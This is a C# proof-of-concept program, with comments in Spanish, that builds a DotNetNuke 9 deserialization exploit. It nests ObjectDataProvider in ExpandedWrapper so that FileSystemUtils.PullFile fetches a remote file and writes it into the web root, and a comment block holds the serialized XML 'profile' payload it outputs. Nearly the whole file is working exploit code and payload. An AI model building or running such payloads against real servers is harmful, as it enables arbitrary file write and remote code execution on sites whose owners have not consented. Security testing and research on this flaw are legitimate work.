// AGREGAR REFERENNCIA
// PresentationFramework.dll -> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\WPF\PresentationFramework.dll
// System.Data.Services.dll  -> C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Data.Services\v4.0_4.0.0.0_b77a5c561934e089\System.Data.Services.dll
//DotNetNuke.dll             -> C:\inetpub\wwwroot\dnn9\bin\DotNetNuke.dll

/*bash
advance@computer MINGW64 /c/Windows/Microsoft.NET
$ find . -name System.Data.Services.dll
./assembly/GAC_MSIL/System.Data.Services/v4.0_4.0.0.0__b77a5c561934e089/System.Data.Services.dll
./Framework/v4.0.30319/System.Data.Services.dll
./Framework64/v4.0.30319/System.Data.Services.dll
*/

using System; 
using System.IO; 
using DotNetNuke.Common.Utilities; 
using System.Collections; 
using System.Data.Services.Internal; 
using System.Windows.Data;

namespace ExpWrapSerializer
{ 
    class Program
    {
        static void Main(string[] args)
        {
            Serialize(); 
        }

        public static void Serialize()
        {
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
            myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
            myExpWrap.ProjectedProperty0.MethodName = "PullFile";

            myExpWrap.ProjectedProperty0.MethodParameters.Add("http://localhost:8000/test.txt");

            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dnn9/POC.txt");

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myExpWrap;
            String payload = XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new
            StreamWriter("C:\\Users\\RICHAR\\Desktop\\ExpWrap.txt");
            writer.Write(payload);
            writer.Close();
            Console.WriteLine("Done!");
        }
    } 
}


/*
<profile>
    <item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
        <ExpandedWrapperOfFileSystemUtilsObjectDataProvider
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema">
            <ProjectedProperty0>
                <ObjectInstance xsi:type="FileSystemUtils" />
                <MethodName>PullFile</MethodName>
                <MethodParameters>
                    <anyType xsi:type="xsd:string">http://localhost:8000/test.txt</anyType>
                    <anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dnn9/POC.txt</anyType>
                </MethodParameters>
            </ProjectedProperty0>
        </ExpandedWrapperOfFileSystemUtilsObjectDataProvider>
    </item>
</profile>
*/
